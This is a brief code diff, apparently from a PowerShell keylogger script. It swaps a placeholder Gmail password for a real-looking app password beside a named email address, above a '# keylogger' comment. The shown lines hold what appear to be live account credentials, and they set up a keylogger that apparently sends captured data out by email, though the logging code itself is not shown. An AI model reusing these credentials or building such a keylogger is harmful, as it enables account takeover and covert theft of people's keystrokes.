@@ -3,7 +3,7 @@
 
 # gmail credentials
 $email = "soleimaniyounes24@gmail.com"
-$password = "password"
+$password = "ypotdmpnfxdxizek"
 
 
 # keylogger
